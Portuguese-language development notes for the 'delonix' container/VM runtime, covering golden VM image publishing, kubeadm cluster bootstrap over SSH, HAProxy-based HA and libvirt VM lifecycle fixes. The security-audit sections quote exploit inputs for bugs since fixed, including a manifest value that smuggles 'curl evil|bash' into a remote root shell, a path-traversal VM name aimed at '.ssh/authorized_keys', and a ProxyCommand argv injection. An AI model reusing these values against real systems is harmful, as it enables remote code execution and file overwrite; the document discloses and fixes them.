  - As receitas sem rede (swap/módulos/sysctls) são partilhadas tal e qual com o caminho online
    (`k8s_recipes::k8s_config_recipes`) — os dois modos **não divergem**. `k8s_host_recipes()` =
    as 2 de rede + estas, para o `cluster apply` (hosts vivos) continuar a ver o catálogo todo.
  - Equivalência com o online **provada**: mesmos pacotes e mesmo estado de hold —
    `kubeadm`/`kubectl`/`kubelet` `hi` 1.34.9-1.1, `kubernetes-cni` `ii` 1.7.1-1.1.
- **`push`/`pull`**: publicam/obtêm a imagem como artefacto OCI de blob único (config vazio + 1
  layer, padrão ORAS/Helm) via `delonix_image::registry::{push_oci_artifact,pull_oci_artifact}`
  (`crates/delonix-image/src/registry.rs`) — generaliza o `Client`/auth/upload já usado por
  `push_to_registry` (imagens de container), sem duplicar a lógica. **PUBLICADA E VALIDADA
  (2026-07-20) via CI** — `ghcr.io/angolardevops/delonix-vm-k8s:1.34` (678.8 MiB, golden
  optimizada), PÚBLICA, com `delonix vm pull` (sem argumento) a descarregá-la de ponta a ponta.
  **`:1.35` publicada a par (2026-07-23)**, mesmo workflow/repositório — as duas tags coexistem
  (`ghcr.io/angolardevops/delonix-vm-k8s:1.34` e `:1.35`).
  O caminho oficial de publicação é o workflow `.github/workflows/vm-image.yml` (disparo manual,
  `workflow_dispatch`, input `k8s_version`): constrói a golden com o binário do próprio commit
  (`image --vm build --offline`) e publica no ghcr. **Lições da publicação real** (a nota anterior
  dizia "publicada em 2026-07-17" mas o package NÃO existia — nunca chegou ao ghcr): (1) o
  **`virt-customize` FUNCIONA em CI** — o bloqueio de `libguestfs` era só do sandbox local, um
  runner `ubuntu-24.04` limpo constrói a golden sem os workarounds; (2) o push do PRIMEIRO package
  de um nome novo no namespace de um **user** (não org) EXIGE um **PAT classic com
  `write:packages`** (secret `GHCR_TOKEN`) — o `GITHUB_TOKEN` do workflow dá **403 Forbidden** mesmo
  com "Workflow permissions: Read and write", porque não pode CRIAR packages novos de user; (3) o
  primeiro push cria o package **privado** — tornar público é um passo manual na UI depois (tags
  seguintes do mesmo package herdam a visibilidade). **Gap conhecido**: o `pull` NÃO recupera os
  metadados (`ubuntu_release`/`k8s_version` ficam `null` — o artefacto OCI só carrega o blob
  qcow2), por isso um `image vm ls` de uma imagem puxada mostra `-` nessas colunas.
- **`ls-remote`** (v0.11.0) — `delonix vm ls-remote` / `image vm ls-remote` / `image --vm
  ls-remote`, sem argumento lista as tags do repositório OCI oficial (`GET
  /v2/<repo>/tags/list`), com argumento qualquer outro repositório — descobre que versões (k8s)
  estão publicadas ANTES de um `pull`, sem tocar em nada local. Reutiliza inteiramente o `Client`/
  auth de `pull`/`push` (`delonix_image::registry::list_remote_tags`, mesmo fluxo 401→token→retry).
  Os três pontos de entrada convergem em `VmImageCmd::LsRemote`, o mesmo padrão triplo que o
  `pull` já seguia. Só a 1.ª página do registo (sem paginação por `Link`) — irrelevante para o
  punhado de tags de uma golden. Validado ao vivo: mostra `1.34` e `1.35` reais no ghcr.io.
- **Bloqueios de host do `virt-customize` — DESAPARECEM com `--offline`** (diagnosticados a
  fundo em 2026-07-17; só afectam o caminho ONLINE, que precisa de DHCP/DNS no appliance):
  1. **Appliance sem cliente DHCP** → `apt-get install` falha com "Could not resolve host".
     Causa-raiz: o `supermin.d/packages` pede `isc-dhcp-client`, mas o supermin só COPIA do host
     e o pacote não estava instalado; o init do appliance tenta `dhclient` e só cai em `dhcpcd`
     como fallback — que também não está nos `hostfiles`. Fix: `sudo apt install isc-dhcp-client`
     (é o que o supermin espera; não é revertido por updates, ao contrário de editar o
     `hostfiles`, que pertence ao pacote `libguestfs0t64`).
  2. **`passt` não dá lease** → o `dhclient` pendura 300s e o build segue SEM rede. Duas camadas:
     (a) o AppArmor (`/etc/apparmor.d/usr.bin.passt`) nega criar socket/PID em
     `/run/user/1000/libguestfs*/` — confirmado por `dmesg | grep 'apparmor.*DENIED.*passt'`; o
     perfil só permite `owner /tmp/**` e `owner @{HOME}/**`, logo
     `XDG_RUNTIME_DIR=$HOME/.cache/libguestfs-run` contorna-o SEM tocar no host. (b) Mesmo assim
     o passt nunca atribui lease (o libguestfs corre-o com `--address 169.254.2.15`), pelo que
     ainda é preciso tirá-lo do PATH (`sudo mv /usr/bin/passt /usr/bin/passt.off`, com `trap`
     para restaurar SEMPRE) → o libguestfs cai no slirp do qemu, que funciona.
  **Conclusão: usar `--offline` e nada disto é preciso.** O `/usr/lib/guestfs` (symlink para
  `/usr/lib/x86_64-linux-gnu/guestfs`, por faltar `libguestfs-common`) continua a ser preciso
  nesta máquina, nos dois modos.

`delonix vm create` ganhou `--hostname`/`--ssh-key <chave-ou-@ficheiro>`/`--user-data <ficheiro>`
— sem `--seed` explícito, gera um ISO NoCloud (`cloud-localds`) por-instância se qualquer um
destes for dado (função pura `build_user_data`, testável sem `cloud-localds` real). Não confundir
com o `build` acima: aquele corre uma vez por IMAGEM (golden), isto corre uma vez por VM.

**`kind: Vm` — paridade total com o CLI + réplica completa do XML libvirt.** A `VmSpec`
(`cmd/vm.rs`) ganhou (1) o **cloud-init declarativo** `hostname`/`sshKeys`/`userData` que só o
CLI tinha; e (2) — CORRIGINDO um bug latente — o `apply` do manifesto passou a gerar **sempre** o
seed (como o CLI), não só quando há volumes: um `kind: Vm` sem volumes ficava sem datasource →
cloud-init saltava a fase de rede → VM sem IP. Além disso, para expressar no manifesto tudo o que
se faz à mão no XML do libvirt, abordagem **"ambos"**: campos **tipados** (`machine`, `cpuModel`
+ `cpuTopology`, `bootOrder`, `tpm`, `video`, `extraDisks` com target dev auto, `extraNics`
network/bridge/user) renderizados no `delonix_vm::libvirt_domain_xml` (função pura, testada), +
dois **escape-hatches de XML cru**: `libvirtXmlOverlay` (fragmentos `<device>` antes de
`</devices>`) e `libvirtXml` (override TOTAL do `<domain>`, verbatim — o seclabel rootless
continua injetado no boot). Os dois hatches são **UNVALIDATED** — só para manifestos confiáveis
(um fragmento pode nomear caminhos/dispositivos arbitrários do host; alinhado com o risco
"manifesto não-confiável" da auditoria E2E). `VmConfig` deriva `Default` (os literais usam
`..Default::default()`); exemplo completo em `examples/vm.yaml`.

**Consola (`vm console`) volta ao shell do host.** A golden faz autologin no ttyS0 → dentro da
consola `exit`/`logout` só re-disparam o getty (loop). O `cmd_console` imprime agora um aviso
claro (i18n) — *voltar ao host: Ctrl+]* — e corre `virsh console` como FILHO (spawn+wait, não
`exec`) para confirmar "De volta ao host" à saída, nos dois backends. E `vm create` mostra
**progresso por etapa** (`CreateStage` emitido pelo motor via `create_with`; texto/i18n no bin) em
stderr + bloco "Próximos passos", com o output cru de `qemu-img`/`virsh` capturado (`run_quiet`);
stdout continua a ser só o nome da VM (scriptável).

`delonix-cri` (`crates/delonix-cri`) ganhou o seu primeiro `[[bin]]` (`src/bin/delonix-cri.rs`)
— antes só existia como library, chamado por ninguém no workspace. Corre `serve_blocking` num
socket unix (`$DELONIX_CRI_ADDR`, default `/run/delonix-cri.sock`) — é o endpoint que o kubelet
fala via `--container-runtime-endpoint`, substituindo containerd/CRI-O.

## Cluster kubeadm (`delonix cluster apply`)

`delonix cluster apply [-f cloud.yaml]` (`kind: Cluster`) — bootstrap `kubeadm` idempotente sobre
SSH em hosts JÁ VIVOS e alcançáveis (não cria VMs — isso é `delonix vm create`, acima). Módulos:
`cmd/remote.rs` (shell-out a `ssh`/`scp` do sistema, `sudo -n` para os comandos remotos — o
utilizador SSH tem de já ter sudo NOPASSWD), `cmd/k8s_recipes.rs` (catálogo PARTILHADO com
`vmimage::build` — repositório `pkgs.k8s.io`/pacotes/swap/módulos/sysctls — para a imagem
dourada e um host preparado por `cluster apply` ficarem exactamente iguais), `cmd/cluster.rs`
(orquestração: prepara todos os hosts → `kubeadm init` no 1.º control-plane → `kubeadm join` dos
restantes control-planes → `kubeadm join` dos workers → traz o kubeconfig para
`<root>/clusters/<nome>-kubeconfig.yaml`, e copia para `~/.kube/config` se ainda não existir).

**Idempotência sem-estado** (pedido explícito, "parecido ao Terraform mas sem ficheiro de
estado"): cada passo de `k8s_recipes` tem um `check` (comando shell, êxito = já satisfeito) e um
`apply`; `kubeadm init`/`join` verificam `/etc/kubernetes/admin.conf`/`kubelet.conf` no host antes
de agir. Nunca dessincroniza de um `.tfstate` porque não há nenhum.

**Simplificações da v1** (pedido era "hosts arbitrários", escopo já grande sem estas):
- **Só etcd `stacked`** (default do kubeadm, co-localizado nos control-planes) — `etcd: external`
  é reconhecido no schema mas recusado com erro claro. Etcd externo (TLS entre membros,
  discovery) é um subprojecto à parte.
- **Execução sequencial**, não paralela, entre hosts — paralelizar a preparação (independente por
  host) é um follow-up de performance, não de correcção.
- **HA multi-control-plane exige `spec.controlPlaneEndpoint` explícito** — kubeadm precisa de um
  endpoint estável (LB/VIP) à frente de vários control-planes; com 1 só, usa o IP dele.
- Sem teste end-to-end real nesta sessão — este sandbox não tem hosts SSH remotos. Validado até à
  fronteira real: parsing/validação do manifesto, resolução do `delonix-cri`, geração dos
  comandos `kubeadm init`/`join`, e a tentativa real de SSH falha correctamente e com clareza
  (`No route to host` num IP de teste) — não há mais nada para simular sem máquinas verdadeiras.

### `delonix cluster kubeadm [--name <n>] --control-plane <n> --workers <n>`

Camada por cima de `cluster apply` (pedido original, primeira sessão desta série: "um comando,
do zero a um cluster a funcionar"). Não escreve nem exige um `cloud.yaml` — provisiona as VMs e
constrói o `ClusterSpec` em memória, depois chama a MESMA `apply_one` que `cluster apply` usa
(zero duplicação da lógica kubeadm/SSH/validação de segurança — tudo em `cmd/cluster.rs`,
`ClusterCmd::Kubeadm`/`provision_and_apply`).

Fluxo: **resolve a imagem VM dourada** (`--vm-image` ou a única existente em
`VmImageStore` — erro claro se houver 0 ou mais de 1, nunca escolhe às cegas) → **gera ou
carrega uma chave SSH** (`--ssh-key`, ou `ssh-keygen -t ed25519` não-interactivo em
`<root>/clusters/<nome>/id_ed25519`) → **cria as VMs sequencialmente**
(`<nome>-cp1..N`/`<nome>-w1..M`, via `delonix_vm::create` com a imagem dourada como disco +
`cmd::vm::generate_seed_iso` para o cloud-init por-instância, reaproveitado tal-e-qual de
`delonix vm create --ssh-key`) → **espera cada VM ficar alcançável por SSH**
(`wait_for_vm_ssh_ready`: primeiro o IP via `delonix_vm::status`, depois um `ssh_check` real —
`--boot-timeout`, default 300s) → constrói o `ClusterSpec` (utilizador SSH sempre `delonix`, a
conta que a imagem dourada já cria) → `validate()` + `apply_one()` (mesmas defesas da auditoria
de segurança, herdadas automaticamente).

#### HA multi-control-plane: HAProxy automático (v0.13.0)

Com `--control-plane > 1`, provisiona automaticamente uma VM extra (`<nome>-lb`) a correr
**HAProxy** como load balancer TCP (L4, passthrough — a TLS do apiserver termina sempre no
control-plane real, nunca no LB) à frente da porta 6443 de cada control-plane, e usa o IP dessa
VM como `controlPlaneEndpoint` do `kubeadm init`/`join` — um único comando produz um cluster HA a
funcionar, sem flag nova (dispara sozinho a partir de `--control-plane > 1`). `delonix cluster
apply` continua a aceitar um `controlPlaneEndpoint` externo/manual para quem já tem o seu próprio LB.

Nada mudou a jusante: `kubeadm_init`/`kubeadm_join` já suportavam multi-control-plane
(`--control-plane-endpoint`/`--upload-certs`/`--certificate-key`) desde a v1 original — a única
lacuna era nunca termos nenhum endpoint real a apontar-lhes. Novo módulo `cmd/lb.rs`:
`build_haproxy_cfg` (função pura, testada) gera o `haproxy.cfg`; `ensure_haproxy` instala o
haproxy via apt se preciso, escreve a config (mesmo idioma de `prepare_host` para o
`delonix-cri`: tmpfile local → scp → `mv` privilegiado) e reinicia o serviço — sempre reescreve +
reinicia, idempotente-simples (mesmo compromisso já aceite no resto do `cluster apply`), seguro
em qualquer re-execução porque o HAProxy é um proxy L4 sem estado e a VM do LB já é idempotente
por nome (auto-heal, como qualquer outra VM deste cluster).

**Sem teste end-to-end real nesta sessão**: o `virt-customize` do build da imagem dourada está
bloqueado neste sandbox (pacote `libguestfs-common` em falta, já documentado acima) — sem uma
imagem local, `delonix cluster kubeadm` não tem o que provisionar. Validado até essa fronteira
real: parsing de flags, `resolve_vm_image` (0/1/N imagens, com testes automatizados), geração de
nomes determinísticos (`vm_names`), e o erro claro e correcto quando não há imagem nenhuma.

#### `--name` opcional + auto-pull de `--vm-image` em falta (v0.12.0)

Dois bugs reais (host kaeso-sys-01): (1) `--name` era obrigatório — sem a mesma analogia do nome
automático angolano (`<rei>-<lugar>-NN`) que containers e `cluster create` (modo kind) já têm;
(2) `--vm-image <v>`/`--k8s-version <v>` sem a imagem local dava sempre erro ("não tem qcow2 em
disco"), mesmo a golden sendo um artefacto OCI publicado precisamente para não precisar de
pull manual — e mesmo quando a imagem ESTAVA local mas só sob o nome de convenção completo
(`delonix-vm-k8s:1.34`), porque `resolve_vm_image` devolvia o valor explícito verbatim sem
verificar essa convenção primeiro.

**Corrigido**:

- `--name` passou a `Option<String>`; sem ele, `random_kubeadm_cluster_name` gera um nome livre
  no mesmo padrão (`super::names::random_name`, extraído do `kindmode::random_cluster_name` para
  ser partilhado pelos dois) — colisão verificada contra os nomes de VM existentes (um cluster
  kubeadm não tem registo próprio, É as suas VMs `<nome>-cp1`/`<nome>-w1`).
- `resolve_vm_image` agora prefere o nome de convenção local (`delonix-vm-k8s:<v>`) quando o
  valor explícito não bate certo com nenhuma imagem local por si só — fecha o caso de uma imagem
  já puxada por `vm pull` (que a guarda sob o nome completo) nunca ser encontrada por um
  `--vm-image` abreviado.
- Quando, mesmo assim, não há imagem local nenhuma, `provision_and_apply` já não desiste — chama
  `vmimage::cmd_pull` contra o repositório oficial (`official_pull_source`, mesma normalização:
  um valor com `/` usa-se tal-e-qual, um valor nu ou `delonix-vm-k8s:<v>` resolve contra
  `ghcr.io/angolardevops/delonix-vm-k8s:<v>`), sob o MESMO nome local que `resolve_vm_image` já
  tinha decidido — a chamada seguinte a `qcow2_path` encontra-a.

Validado ao vivo: `--vm-image 1.34` (já local, sob `delonix-vm-k8s:1.34`) resolve sem tentar
nenhum download; `--vm-image 1.35` (ausente) imprime "a descarregar de
'ghcr.io/angolardevops/delonix-vm-k8s:1.35'..." e inicia o pull real; sem `--name`, gera
`nzinga-cacuaco-19` e prossegue para a geração da chave SSH.

## Auditoria de segurança (skill `delonix-runtime-sec`)

Antes de estender `delonix cluster apply`, foi feita uma auditoria ofensiva dedicada (skill nova
`.claude/skills/delonix-runtime-sec/`, perfil de red-team especializado em runtimes de
containers/VMs) — 3 revisões adversariais em paralelo (injecção de comandos, escalada de
privilégio/fuga de namespace, memory safety + cadeia de fornecimento + path traversal).

**Veredicto da fronteira rootless→root**: sólida, nenhum CRÍTICO/ALTO. Socket de controlo do
holder valida `SO_PEERCRED` correctamente entre user namespaces; `join_netns` só recebe caminhos
gerados server-side (nunca input directo do CLI); mapeamento de uid não permite apontar para uid
0 real do host em nenhum dos 3 caminhos (root real/rootless single-uid/rootless com subuid).

**4 achados CRÍTICOS confirmados e CORRIGIDOS nesta mesma sessão** (todos em código novo desta
sessão, nunca tinham sido revistos adversarialmente):

1. **Injecção de comandos via manifesto `Cluster`** — `controlPlaneEndpoint`/`podSubnet`/
   `serviceSubnet`/`k8sVersion` entravam sem saneamento num `format!` que vira o CORPO de um
   `sudo -n bash -c` remoto (`cmd::cluster::kubeadm_init`/`kubeadm_join`). Um `cloud.yaml` com
   `controlPlaneEndpoint: "10.0.0.10; curl evil|bash; #"` era RCE como root no host de produção.
   **Corrigido**: `cmd::cluster::{valid_endpoint,valid_cidr,valid_version}` — whitelist estrita de
   caracteres, chamada em `validate()` antes de qualquer interpolação. `shell_quote` (`remote.rs`)
   só protege a fronteira ssh→bash-c local — nunca sanitiza o CONTEÚDO do comando; esta era a
   lição a reter (documentada nos comentários das funções `valid_*`).
2. **Mesmo vector via `k8sVersion` em `k8s_recipes::k8s_host_recipes`** (repositório apt,
   corrido em TODOS os hosts, incluindo antes do `kubeadm init`) — **corrigido** com a mesma
   validação, reaproveitada também em `vmimage::cmd_build` (`--k8s-version` tem o mesmo caminho).
3. **`pull_oci_artifact` não verificava o digest do blob recebido** contra o manifesto — um
   registo `ghcr.io` comprometido podia servir uma imagem VM dourada adulterada sem detecção.
   **Corrigido**: verificação `sha256(bytes) == digest_esperado` antes de devolver, mesmo padrão
   já usado por `pull_from_registry_with_creds` (que já estava correcto).
4. **Path traversal em `COPY` do `delonix build`** — `src`/`dst` de um Dockerfile/Delonixfile não
   eram confinados ao contexto/rootfs (`..` não neutralizado). **Corrigido**: `cmd::build::
   safe_join` (mesmo padrão de `safe_rel` em `delonix-image::overlay`), rejeita qualquer
   componente `..`/absoluto fora da base.

**2 achados BAIXOS, defesa em profundidade, também corrigidos**: `--` antes de `user@host` nos
argv de `ssh`/`scp` (`remote.rs`); `VmImageStore::base_cache_path` passou a usar `sanitize()`
como os outros métodos do store (`vmimage.rs`).

Todos os 4 CRÍTICOS têm teste automatizado a replicar o exploit e confirmar a rejeição (`cargo
test -p delonix-runtime-bin`/`-p delonix-image`) — ver `cmd::cluster::tests::
validate_recusa_endpoint_malicioso_no_manifesto_completo`,
`registry::tests::pull_oci_artifact_recusa_blob_adulterado`,
`cmd::build::tests::safe_join_recusa_dot_dot`.

## Falhas silenciosas corrigidas (fail-closed) + 1 documentada

Da análise Docker/Podman (`docs/COMPARACAO-DOCKER-PODMAN.md`), quatro casos em
que uma opção era ACEITE e depois IGNORADA — pior que uma feature em falta,
porque o utilizador julga estar protegido. Três corrigidos para fail-closed
(erro/aviso explícito, alinhado ao invariante "sem falha silenciosa"):

1. **`--security-opt seccomp=<perfil.json>`** — perfil custom era ignorado (o
   container corria com o allowlist embutido). Passa a ERRO explícito: só
   `seccomp=unconfined` é suportado; perfis custom não estão implementados.
2. **`-v host:/dst:z|:Z|:U|<propagação>`** — o 3.º campo só reconhecia `ro`; as
   opções SELinux eram ignoradas e o bind falhava em RHEL/Fedora enforcing.
   Passa a ERRO: só `:ro`/`:rw` suportados (`resolve_spec`).
3. **`--network-alias`** — gravado mas o `dns_resolve` nunca o consultava.
   Passa a AVISO no `run` (implementar a resolução por alias é follow-up).

**Ainda por corrigir (documentado, precisa de teste em cgroup delegado real):**
4. **`container update --memory/--cpus` em rootless-delegado é no-op silencioso**
   — escreve num leaf que não existe no modo delegado (systemd `Delegate=yes`),
   enquanto o limite real vive noutro leaf. Também `cpuset`/`cpu.weight`/
   `io.weight` só se aplicam no caminho não-delegado (root). Fechar exige apontar
   para o leaf correcto do subtree delegado — trabalho de cgroup a validar num
   host com delegação, não neste sandbox.

## Auditoria de segurança #2 (código VM desta série: console/rede/cloud-init)

Skill `delonix-runtime-sec` corrida sobre a superfície NOVA das v0.7.x (VM
console/vnc, firmware/backend automáticos, rede libvirt, cloud-init user-data,
instalador). O container `run` está limpo (id gerado + `safe_key`); a VM era a
excepção porque os caminhos auxiliares usavam o nome CRU.

**Achado ALTO — CORRIGIDO — path traversal via nome da VM.** O nome (do CLI OU
de `metadata.name` de um manifesto NÃO-confiado via `stack apply -f`) fluía cru
para `state_root/vms/<name>` (`generate_seed_iso`) e para o overlay
`<name>.qcow2` — um `metadata.name: "../../.ssh/authorized_keys"` escrevia/
sobrescrevia ficheiros FORA do directório de estado, como o utilizador
(arbitrary file write conduzido por manifesto). O `JsonStore` já sanitizava o
`.json` (`safe_key`), mas os caminhos de seed/overlay/sock não. **Fix**:
`delonix_vm::valid_vm_name` (whitelist `[A-Za-z0-9._-]`, sem `..`/`/`/`-`
inicial/controlo) chamada no topo de `delonix_vm::create` — o boundary do
motor, por isso qualquer consumidor da API herda. Fecha de uma vez os 3
vectores do nome: traversal, argv do `virsh`, e injecção no YAML do cloud-init
(o nome vira `hostname`). Teste `valid_vm_name_recusa_exploits`.

**Achado BAIXO — CORRIGIDO — argv do `virsh` sem `--`.** `virsh -c uri console/
start/destroy/domstate/... <name>` sem `--`: um nome começado por `-` seria lido
como opção. Coberto já pela `valid_vm_name`, mas acrescentou-se `--` antes do
nome/rede em todos os argv `virsh` (defesa em profundidade, mesmo padrão do
`ssh`/`scp` da auditoria #1).

**Achado MÉDIO — CORRIGIDO — ficheiro temp previsível (rede libvirt).**
`ensure_libvirt_network` escrevia o XML da rede em `/tmp/delonix-libvirt-
default-<pid>.xml` (nome previsível, world-writable) com `fs::write` — outro
utilizador local podia pré-criar um symlink e desviar a escrita. **Fix**:
`OpenOptions::create_new` (O_EXCL, não segue symlinks) + `mode(0o600)`.

**Achado MÉDIO — DOCUMENTADO — downloads do instalador sem checksum.** O
`install.sh` verifica o binário `delonix` contra o `SHA256SUMS`, mas o
`cloud-hypervisor-static` e o `hypervisor-fw` (upstreams oficiais) são
instalados só com HTTPS, sem verificação de hash — o upstream não publica
checksums num formato conveniente. MITM mitigado por TLS; um upstream
comprometido ou TLS-stripping passaria. Aceite como risco documentado (mesma
natureza do cloud-hypervisor que já se instalava assim); fechar exigiria os
upstreams publicarem/pinar-se um digest.

## Auditoria E2E ampla (14 finders × verificação adversarial) — estado

Auditoria ofensiva de todo o ecossistema (~50k LOC, 9 crates: bugs/gaps/design/
performance/concorrência/memória/recursos), 14 finders por subsistema, cada
achado passado por 2 céticos adversariais. **Relatório completo em
[docs/AUDITORIA-E2E.md](docs/AUDITORIA-E2E.md)** — 24 achados confirmados (6 HIGH,
12 MEDIUM, 6 LOW) + 11 por-verificar nessa corrida original.

**Os 6 HIGH foram CORRIGIDOS no v0.9.0** (path traversal em whiteouts OCI via
`safe_rel`+confinamento canonicalizado; IDs de CRI via `valid_cri_id`+`remove_rec`;
nome de VM em `generate_seed_iso` via `valid_vm_name` na origem; kubeconfig via
`sudo cat` para stdout do SSH, nunca toca em disco remoto; `COPY` do build via
`confine_to` (canonicaliza + confere `starts_with`); socket de gestão via
`SO_PEERCRED`+modo 0600, espelhado no `delonix-cri`) — **re-verificados ao vivo
numa 2.ª sessão (2026-07-23), código actual lido linha a linha, os 6 continuam
corrigidos**, sem regressão.

**Os outros 29 (12 MEDIUM + 6 LOW confirmados + 11 por-verificar) continuam TODOS
em aberto** — re-confirmados na mesma sessão (nenhum foi refutado, nenhum
parcialmente corrigido); ver o relatório completo para detalhe/correcção de cada
um. Entre os "por-verificar" da corrida original, dois destacam-se por severidade
alta e vale re-ler antes de mexer nesse código: fuga de rootfs no `--rm`
(`container.rs`, ambos os ramos foreground/watcher nunca chamam
`remove_container_dir`) e o `egress` global que apaga regras per-network por
correspondência de substring demasiado ampla (`infra.rs:1531`, ver abaixo).

### 2.ª ronda (2026-07-23) — 4 auditorias em paralelo, 2 CRITICAL + 3 HIGH novos, CORRIGIDOS no v0.10.1

Pedida uma revisão completa (bugs/gaps/design/arquitectura, não só segurança).
Além de re-verificar os 35 achados acima, 3 auditorias frescas: `delonix-runtime/
lib.rs` (104 `unsafe`, NUNCA antes auditado), `delonix-net/infra.rs` (holder/
control-socket), e todo o código desta MESMA sessão anterior (Tunnel, ShareVolume,
`cluster.rs`, specs agrupados) — código com zero revisão prévia. 2 CRITICAL + 3
HIGH, **todos já em produção no v0.10.0**, corrigidos de imediato (ver
[docs/releases/v0.10.1.md](docs/releases/v0.10.1.md) para o detalhe completo):

1. **`kind: ShareVolume` com `name: ".."` escapava para o Storage pai inteiro** —
   `VolumeStore::valid_name` aceitava um nome só de `.` (`".."` passava no
   charset); `sharevolume rm --purge-data` nesse nome apagava o NAS partilhado
   inteiro. Corrigido no `valid_name` (recusa `.`-prefixo/`..`), protege todos os
   consumidores do store.
2. **Injecção de argv SSH via token do `kind: Tunnel`** — o token do pinggy ia
   sem `--` como último argumento posicional do `ssh`; um token
   `-oProxyCommand=<cmd>` era lido como opção → RCE local. Corrigido em
   `resolve_token` (recusa `-` inicial) + `--` no argv.
3. **Nomes de container nunca validados** — `container run --name
   registry.npmjs.org` (sem privilégio) sequestrava a resolução DNS desse
   hostname para TODO o nó, em qualquer namespace. Corrigido com
   `valid_container_name` (exclui `.` deliberadamente, ao contrário do
   `valid_vm_name`).
4. **`cluster kubeadm --copy-kubeconfig` confiava no `admin.conf` remoto por
   inteiro** — um `users[].user.exec` legal vira RCE local no operador se o
   control-plane for comprometido depois do provisionamento. Corrigido:
   `safe_cluster_entry`/`safe_user_entry` constroem entradas novas só com os
   campos que o `admin.conf` real do kubeadm tem.
5. **Bind-mounts seguiam symlinks plantados pela imagem, antes do `pivot_root`**
   — `mount_target_safe` só lexical; a imagem podia redireccionar
   `create_dir_all`/`open` para qualquer caminho real do host. Corrigido com
   `safe_bind_target` (resolve componente a componente, recusa symlinks) — o
   equivalente, do lado do motor, ao `confine_to` do build.

Todos validados ao vivo contra o exploit real, não só testes unitários (ver o
histórico de commits `4c3e223`/`456925f`). Achado #3 acima é uma escalada do
achado "por-verificar" MEDIUM de DNS hijack da corrida original (o CLI directo,
sem manifesto nenhum, já bastava).

## Ciclo de vida VM no libvirt (`vm stop/rm`) — managed save, órfãos, `--force`

Bug report real (host kaeso-sys-01): `vm rm dev` vazava o stderr cru do `virsh`
("Failed to destroy… not running" + "Refusing to undefine while domain managed
save image exists"), apagava o registo local NA MESMA e deixava o domínio
**órfão** no libvirt; o `vm stop` seguinte respondia "no such container" (o
substantivo errado). Corrigido em `delonix-vm` (`libvirt_cleanup`/`quiet`/
`libvirt_poweroff`/`libvirt_domain_uri`) + `cmd/vm.rs`:

- **`undefine` leva sempre `--managed-save --snapshots-metadata --nvram`**
  (fallback para o simples em virsh antigo) — era a causa-raiz da recusa; o
  `destroy` só corre se o domínio NÃO estiver "shut off". Nada do `virsh` vaza
  cru: `quiet()` captura stdout+stderr e compõe a mensagem (sem o prefixo
  `error: ` do virsh).
- **`VmBackend::stop` devolve `Result`** e o `rm` **preserva o registo local se
  a limpeza no backend falhar** (erro claro + hint); `vm rm -f/--force`
  descarta o estado local na mesma. Sem órfãos silenciosos em nenhum sentido:
  `rm`/`stop` também reconhecem um domínio libvirt SEM registo local (órfão de
  antes do fix) e limpam-no/desligam-no.
- **`Error::VmNotFound`** ("no such VM: … (see `delonix vm ls`)") em
  `stop`/`remove`/`status` — o `NotFound` partilhado diz "no such container".
  Armadilha a reter: **`JsonStore::remove` é idempotente** (ausência = Ok),
  por isso o "não existia" tem de se decidir ANTES (flag `existed`), não pelo
  retorno do `st.remove`. `vm rm <inexistente>` agora é erro, como no docker.
- Aliases: `vm down` = `stop`, `vm delete` = `rm`. Testes:
  `quiet_captura_o_stderr_sem_o_prefixo_error`,
  `stop_e_remove_de_vm_inexistente_dizem_no_such_vm`. Validado ao vivo: o
  órfão `dev` real (shut off + managed save) foi removido em silêncio.

### `vm console` preso em "Active console session exists" (v0.11.1)

Bug report real (host kaeso-sys-01): depois de um `vm console` terminar de
forma não limpa (SSH caída, Ctrl-C a atingir o `virsh` em primeiro plano,
terminal fechado), o libvirt continua a achar que há uma sessão de consola
ligada a esse domínio — toda a tentativa seguinte de `vm console` na MESMA VM
falha para sempre com `error: operation failed: Active console session exists
for this domain`, sem saída a não ser reiniciar o `libvirtd` do host.
**Corrigido**: `--force` no `virsh console` (`cmd_console`, `cmd/vm.rs`) — a
flag existe exactamente para isto ("disconnect already connected sessions").
Como `vm console <nome>` é um comando de um único operador, uma sessão presa
da tua PRÓPRIA ligação anterior é o caso esmagadoramente comum, não um
segundo espectador real a proteger.

### `vm start`/`vm restart` (v0.12.0) — trazer de volta uma VM parada, sem redigitar as flags

Bug report real (o mesmo `dev` do achado acima): depois de o `vm console`
finalmente destrancar, o domínio afinal já estava mesmo `Stopped` (motivo fora
do alcance do delonix — ver secção anterior). A única forma de voltar a
arrancá-la era `delonix vm create dev` de novo, que É idempotente/auto-heal
(reaproveita o overlay), mas **exige as MESMAS flags** (`--vcpus`/`--memory`/
`--disk`/etc.) — sem elas, o "auto-heal" arrancaria com os defaults do clap
(1 vCPU, 1G), silenciosamente diferente da VM original. `vm start`/`vm
restart` (`delonix_vm::{start,restart}`, `crates/delonix-vm/src/lib.rs`)
resolvem isto: reconstroem a `VmConfig` a partir do PRÓPRIO registo persistido
(`config_from`) — disco base, vcpus, memória, rede, backend, `restart_policy`,
`devices`, e (só libvirt) o net mode, que `LibvirtBackend::boot` já guardava
disfarçado no campo `Vm.tap` (`cfg.net_mode.unwrap_or("user")`) — e delegam no
mesmo `create`/auto-heal de sempre.

**Limitação honesta, documentada no próprio `--help`**: o registo `Vm` nunca
persistiu tudo o que a `VmConfig` completa tem — kernel/initrd/firmware/
cmdline de boot directo, seed de cloud-init próprio, volumes 9p, IP estático,
VNC, e os campos avançados de libvirt (machine/cpu model/topology/TPM/video/
boot order/discos ou NICs extra/XML cru) só existiram como flags do `vm
create` e morrem depois de ele terminar. Uma VM que precise de algum destes
tem de voltar pelo `vm create` original (também idempotente) — `start`/
`restart` cobrem o caso comum (imagem dourada, sem flags avançadas), não
substituem `create` para o resto. `vm start` é idempotente (já a correr = sem
efeito, delega no `create`); `vm restart` força sempre um reboot real (pára
primeiro se estiver a correr).

## Rede das VMs libvirt — default `nat` com IP, `--ip` estático, rotas VM↔container

Bug report real: `vm create dev` mostrava `IP <none>` para sempre — sem
`--net-mode` e rootless, o backend libvirt caía em `qemu:///session` user-mode
(SLIRP), cujo IP é invisível ao `domifaddr` e inalcançável. Corrigido:

- **Default inteligente** (`LibvirtBackend::boot`): sem `--net-mode`, se a
  conexão de SISTEMA é utilizável (`system_libvirt_usable`, grupo `libvirt`),
  o modo efectivo passa a **`nat`** → IP por DHCP da rede libvirt, visível e
  alcançável. Só sem acesso ao system fica user-mode, e o `create` AVISA alto
  ("no reachable IP — join the `libvirt` group…"). `Vm.tap` passou a registar o
  **modo efectivo** (`nat`/`bridge`/`user`) — é o que o `wait_for_boot` usa
  para distinguir "esperar o lease DHCP" de "nunca vai ter IP" (antes desistia
